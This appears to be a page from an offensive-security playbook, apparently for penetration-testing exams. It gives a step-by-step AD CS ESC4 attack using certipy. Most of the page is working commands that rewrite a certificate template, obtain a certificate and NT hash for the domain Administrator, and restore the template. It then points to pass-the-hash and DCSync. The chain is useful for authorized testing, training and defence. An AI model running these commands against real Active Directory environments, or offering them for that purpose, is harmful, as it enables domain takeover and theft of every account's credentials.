---
id: adcs-esc4
title: ADCS ESC4 — Writable Template ACL
stage: privesc
tags: [windows, ad]
summary: Overwrite a certificate template's configuration to make it ESC1-vulnerable, then exploit it as Administrator — requires write access to the template object in AD.
leads_to:
  - adcs-esc1
  - domain-admin
  - dcsync
---

## Prerequisites

A domain account with `Full Control`, `Write Owner`, or `Write DACL` on a certificate template object — visible in BloodHound as an edge to the template. certipy installed. The CA name from `certipy find` output.

ESC4 is a two-step chain: you overwrite the template's configuration to enable `Enrollee Supplies Subject` (making it ESC1-vulnerable), then exploit it exactly like ESC1. The old template config must be saved first so you can restore it after — some exam graders check for clean environments. BloodHound shows the write permission as an edge directly to the template object.

## Quick Win

> Save the template, overwrite to ESC1 config, request as Administrator, restore — full chain in four commands.

```bash
certipy template -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -template 'TargetTemplate' -save-old
certipy template -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -template 'TargetTemplate' -write-default-configuration
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -ca 'CA-NAME' -template 'TargetTemplate' -upn Administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

## Full ESC4 → ESC1 Chain

> Four steps — save, overwrite, exploit, restore.

```bash
# Step 1: Save current template config (required for cleanup)
certipy template -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -template 'TargetTemplate' -save-old

# Step 2: Overwrite template with ESC1-vulnerable config
certipy template -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -template 'TargetTemplate' -write-default-configuration

# Step 3: Request cert as Administrator
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -ca 'CA-NAME' -template 'TargetTemplate' -upn Administrator@$DOMAIN

# Windows Server 2022 with StrongCertificateBindingEnforcement — add the SID:
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -ca 'CA-NAME' -template 'TargetTemplate' -upn Administrator@$DOMAIN \
  -sid S-1-5-21-...-500

# Step 4: Get NT hash from cert
certipy auth -pfx administrator.pfx -dc-ip $DC_IP

# Step 5: Restore template (clean up after)
certipy template -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -template 'TargetTemplate' -configuration TargetTemplate.json
```

## Leads To

`certipy auth` returns Administrator NT hash → PTH to DC → domain-admin. Then DCSync for all hashes. The `TargetTemplate.json` saved in Step 1 is what you pass to the restore command — always clean up or the CA is left in a permanently exploitable state.
